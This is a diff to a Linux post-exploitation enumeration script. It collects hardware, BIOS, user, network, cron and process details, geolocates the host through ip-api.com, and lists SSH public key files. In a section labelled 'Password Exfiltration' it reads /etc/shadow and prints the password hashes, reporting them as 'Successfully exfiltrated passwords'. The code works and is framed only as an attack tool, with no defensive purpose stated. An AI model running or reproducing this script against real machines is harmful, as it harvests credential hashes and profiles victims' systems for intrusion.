@@ -36,6 +36,26 @@ os=`uname -o` 2>/dev/null
 echo "\e[36mOS           : \e[39m$os"
 echo
 
+echo "\e[31m--Hardware Info--\e[39m"
+cpu=`lscpu | grep 'Model name:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
+echo "\e[36mCPU            : \e[39m$cpu"
+gpu=`lshw -C display | grep "product:" | awk -F ': ' '{print $2}'` 2>/dev/null
+echo "\e[36mGPU            : \e[39m$gpu"
+echo "\e[36mArchitecture   : \e[39m$architecture"
+memOnline=`lsmem | grep 'Total online memory:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
+echo "\e[36mOnline memory  : \e[39m$memOnline"
+memOffline=`lsmem | grep 'Total offline memory:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
+echo "\e[36mOffline memory : \e[39m$memOffline"
+echo
+
+echo "\e[31m--BIOS Info--\e[39m"
+biosVendor=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Vendor' | awk -F ': ' '{print $2}'` 2>/dev/null
+echo "\e[36mBIOS Vendor       : \e[39m$biosVendor"
+biosVersion=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Version' | awk -F ': ' '{print $2}'` 2>/dev/null
+echo "\e[36mBIOS Version      : \e[39m$biosVersion"
+biosReleaseDate=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Release Date' | awk -F ': ' '{print $2}'` 2>/dev/null
+echo "\e[36mBIOS Release Date : \e[39m$biosReleaseDate"
+echo
 echo "\e[31m--User Info--\e[39m"
 users=`awk -F: '{print $1}' /etc/passwd | sort | tr '\n' ' '` 2>/dev/null
 echo "\e[36mAll users        : \e[39m$users"
@@ -59,12 +79,6 @@ echo "\e[36mwho output       : \e[39m"
 echo "$whoOut"
 echo
 
-echo "\e[31m--Password Exfiltration--\e[39m"
-passwords=`cat /etc/shadow | grep -v "*\|!" | sort` 2>/dev/null
-echo "\e[36mSuccessfully exfiltrated passwords : \e[39m"
-echo "$passwords"
-echo
-
 echo "\e[31m--Network Info--\e[39m"
 interfaces=`ip link show | sed '0~2d' | awk -F ': ' '{print $2}' | sort | tr '\n' ' '` 2>/dev/null
 echo "\e[36mNetwork interfaces  : \e[39m$interfaces"
@@ -78,7 +92,30 @@ publicIP=`dig +short myip.opendns.com @resolver1.opendns.com` 2>/dev/null
 echo "\e[36mPublic IP address   : \e[39m$publicIP"
 echo
 
-echo "\e[31m--Processes--\e[39m"
+echo "\e[31m--Location Info (Based on Network)--\e[39m"
+info=`curl http://ip-api.com/line/$publicIP` 2>/dev/null
+country=`echo "$info" | sed '2!d'` 2>/dev/null
+echo "\e[36mCountry      : \e[39m$country"
+region=`echo "$info" | sed '5!d'` 2>/dev/null
+echo "\e[36mRegion       : \e[39m$region"
+city=`echo "$info" | sed '6!d'` 2>/dev/null
+echo "\e[36mCity         : \e[39m$city"
+zip=`echo "$info" | sed '7!d'` 2>/dev/null
+echo "\e[36mZIP Code     : \e[39m$zip"
+lat=`echo "$info" | sed '8!d'` 2>/dev/null
+lon=`echo "$info" | sed '9!d'` 2>/dev/null
+echo "\e[36mlat, lon     : \e[39m$lat $lon"
+timezone=`echo "$info" | sed '10!d'` 2>/dev/null
+echo "\e[36mTime zone    : \e[39m$timezone"
+isp=`echo "$info" | sed '11!d'` 2>/dev/null
+echo "\e[36mISP          : \e[39m$isp"
+organization=`echo "$info" | sed '12!d'` 2>/dev/null
+echo "\e[36mOrganization : \e[39m$organization"
+asn=`echo "$info" | sed '13!d'` 2>/dev/null
+echo "\e[36mAS Number    : \e[39m$asn"
+echo
+
+echo "\e[31m--Cron Info--\e[39m"
 crond=`ls /etc/cron.d/ | tr '\n' ' '` 2>/dev/null
 echo "\e[36mcron.d       : \e[39m$crond"
 cronhourly=`ls /etc/cron.hourly/ | tr '\n' ' '` 2>/dev/null
@@ -91,22 +128,20 @@ cronmonthly=`ls /etc/cron.monthly/ | tr '\n' ' '` 2>/dev/null
 echo "\e[36mcron.monthly : \e[39m$cronmonthly"
 echo
 
-echo "\e[31m--Hardware Info--\e[39m"
-cpu=`lscpu | grep 'Model name:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
-echo "\e[36mCPU            : \e[39m$cpu"
-gpu=`lshw -C display | grep "product:" | awk -F ': ' '{print $2}'` 2>/dev/null
-echo "\e[36mGPU            : \e[39m$gpu"
-echo "\e[36mArchitecture   : \e[39m$architecture"
-memOnline=`lsmem | grep 'Total online memory:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
-echo "\e[36mOnline memory  : \e[39m$memOnline"
-memOffline=`lsmem | grep 'Total offline memory:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
-echo "\e[36mOffline memory : \e[39m$memOffline"
+echo "\e[31m--Processes--\e[39m"
+echo "\e[36mUser processes (excluding GNOME/KDE) : \e[39m"
+echo "\e[36mPID\tProcess\e[39m"
+processes=`ps -u | sed '1d' | awk -F ' ' '{printf "%s\t%s\n", $2, $11}' | grep -v 'gnome\|kde'` 2>/dev/null
+echo "$processes"
 echo
 
-echo "\e[31m--BIOS Info--\e[39m"
-biosVendor=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Vendor' | awk -F ': ' '{print $2}'` 2>/dev/null
-echo "\e[36mBIOS Vendor       : \e[39m$biosVendor"
-biosVersion=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Version' | awk -F ': ' '{print $2}'` 2>/dev/null
-echo "\e[36mBIOS Version      : \e[39m$biosVersion"
-biosReleaseDate=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Release Date' | awk -F ': ' '{print $2}'` 2>/dev/null
-echo "\e[36mBIOS Release Date : \e[39m$biosReleaseDate"
+echo "\e[31m--Password Exfiltration--\e[39m"
+passwords=`cat /etc/shadow | grep -v "*\|!" | sort` 2>/dev/null
+echo "\e[36mSuccessfully exfiltrated passwords : \e[39m$passwords"
+echo
+
+echo "\e[31m--Found SSH Keys--\e[39m"
+foundSSHKeys=`ls ~/.ssh/ | grep '.pub' | tr '\n' ' '` 2>/dev/null
+echo "\e[36m~/.ssh/ : \e[39m$foundSSHKeys"
+echo
+
